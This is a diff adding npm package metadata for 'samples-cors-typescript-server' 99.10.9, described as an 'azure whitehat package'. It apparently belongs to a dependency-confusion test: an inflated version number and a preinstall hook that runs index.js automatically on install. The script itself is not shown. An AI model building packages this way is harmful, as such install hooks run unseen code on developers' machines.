@@ -1,0 +1,39 @@
+{
+    "name": "samples-cors-typescript-server",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "samples-cors-typescript-server@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-50AtBDHxNeMPNyhONIHA9dfw5OOVHAZv6EYtMIaZibywNeP0c5lAPM9PvwYX+Kab/sJb+seRISrdHkjFonoCJg==",
+        "shasum": "ca86da8644250d946c7b63dd59750c2ad7b3e5bd",
+        "tarball": "https://registry.npmjs.org/samples-cors-typescript-server/-/samples-cors-typescript-server-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3594,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoREPCRA9TVsSAnZWagAAEsYP/17IU/0cl0ILu4GCPiit\nM3RUeEzPH2CuTBKNfnLqcxsZ0POAs0HxUIMVS207ExsvCugwBt5lVj8qWAwx\nm1rcffx2R96jsu+1yeS9ZSA+LN0pzhvcTWzt5DT2Gxse7LyzjwNrcRoBBnXK\ngwB0XFx7uhahOEf39ed9HFBkGXUzWpcfzk6clr02uDILj7w6MU3NgnQFn1E4\n8I5eLyEhQAPuuJg65LBqF8Up8vNQH810TP0hO64t3hyjOYaIJotX877WxI17\n7Y9W6ipDdwyGRMmjAenjwyE4YTZl0x6ruVs3Gi1ckIKSowx14ew00pRuZ3Zo\ngg6rU/JDwoJj5M5RsFfWnU82teZJRR4KE3kSPvQR/6ui8EPrO/Aa+zvgOhY1\nBbDfZMkg7LdcpmHDBdVS7UAOly2YeGubsCvJtFtLqlXfKIRWg9bgXEIl8k3d\nzKeKnt80A8rr+Gij+lXcJyu4ApB7pZxk5okyDPRmrrUs++0a9+YlnfSGgb/W\nDAeZyuV7NHyFQJ0S4kTuUNGa/s9eYyJs93/tKNtOr/HuIQdZ1HlRfqsA1qzg\nQZD2GkyW8AYb6nW7tqjup3Rq5sKOPd8GmSdkJ3EgCi149L4bRT6SgrgV3Qlb\nSW1Culapv+jOSr1jkYuC/reHDafFi6higYfbvYbGwfsH/fxMIjoPMX7isZRi\nQcSV\r\n=wpNU\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/samples-cors-typescript-server_99.10.9_1637945614934_0.6026708264797656"
+    },
+    "_hasShrinkwrap": false
+}
